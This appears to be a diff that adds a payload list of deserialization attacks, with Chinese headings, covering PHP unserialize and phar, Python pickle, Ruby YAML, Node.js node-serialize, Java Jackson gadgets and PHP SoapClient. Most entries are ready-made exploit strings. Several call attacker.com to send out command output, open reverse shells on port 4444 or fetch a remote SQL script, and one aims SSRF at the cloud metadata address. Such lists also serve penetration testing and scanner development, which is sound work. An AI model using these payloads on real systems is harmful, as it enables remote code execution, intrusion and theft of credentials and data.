@@ -1,0 +1,20 @@
+# 反序列化 - PHP unserialize 对象注入 RCE
+O:8:"Example2":1:{s:4:"hook";s:43:"system('curl attacker.com/$(whoami|base64)');";}
+# 反序列化 - PHP phar 反序列化 RCE (文件上传马 + phar:// LFI)
+O:10:"PHPObject":1:{s:6:"inject";s:10:"phpinfo();";}
+# 反序列化 - Python pickle 反序列化反弹 Shell
+cos\nsystem\n(S'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'\ntR.
+# 反序列化 - Ruby YAML 反序列化命令执行
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  specs:
+  - !ruby/object:Gem::Source::Git
+    name: evil
+    git: "`curl attacker.com/$(whoami|base64)`"
+# 反序列化 - Node.js node-serialize RCE
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"')}()"}
+# 反序列化 - Java Spring Boot RCE (Jackson gadgets)
+["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'"}]
+# 反序列化 - PHP SoapClient SSRF 通过反序列化
+O:10:"SoapClient":2:{s:3:"uri";s:28:"http://169.254.169.254/latest/";s:8:"location";s:39:"http://169.254.169.254/latest/meta-data/";}
